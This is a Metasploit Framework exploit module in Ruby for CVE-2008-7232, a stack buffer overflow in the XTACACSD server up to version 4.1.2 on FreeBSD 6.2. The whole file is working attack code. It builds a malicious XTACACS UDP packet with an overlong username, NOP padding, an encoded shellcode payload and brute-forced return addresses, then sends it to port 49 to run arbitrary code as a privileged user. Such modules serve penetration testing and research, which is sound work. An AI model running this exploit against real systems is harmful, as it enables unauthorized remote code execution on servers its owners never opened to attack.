##
# $Id: xtacacsd_report.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Udp
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'XTACACSD <= 4.1.2 report() Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in XTACACSD <= 4.1.2. By
				sending a specially crafted XTACACS packet with an overly long
				username, an attacker may be able to execute arbitrary code.
			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					['CVE', '2008-7232'],
					['OSVDB', '58140'],
					['URL', 'http://aluigi.altervista.org/adv/xtacacsdz-adv.txt'],
				],
			'Payload'        =>
				{
					'Space'    => 175,
					'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x83\xec\x7f",
					'DisableNops'   =>  'True',
				},
			'Platform'       => 'BSD',
			'Arch'           => ARCH_X86,
			'Targets'        =>
				[
					['FreeBSD 6.2-Release Bruteforce',
						{'Bruteforce' =>
							{
								'Start' => { 'Ret' => 0xbfbfea00 },
								'Stop'  => { 'Ret' => 0xbfbfef00 },
								'Step'  => 24,
							}
						},
					],
				],
			'Privileged'     => true,
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 8 2008'))

		register_options([Opt::RPORT(49)], self.class)
	end

	def brute_exploit(address)
		connect_udp

		sploit =  "\x80" # Version
		sploit << "\x05" # Type: Connect
		sploit << "\xff\xff" # Nonce
		sploit << "\xff" # Username length
		sploit << "\x00" # Password length
		sploit << "\x00" # Response
		sploit << "\x00" # Reason
		sploit << "\xff\xff\xff\xff" # Result 1
		sploit << "\xff\xff\xff\xff" # Destination address
		sploit << "\xff\xff" # Destination port
		sploit << "\xff\xff" # Line
		sploit << "\x00\x00\x00\x00" # Result 2
		sploit << "\x00\x00" # Result 3
		sploit << make_nops(238 - payload.encoded.length)
		sploit << payload.encoded + [address['Ret']].pack('V')

		print_status("Trying target #{target.name} #{"%.8x" % address['Ret']}...")
		udp_sock.put(sploit)

		disconnect_udp
	end

end
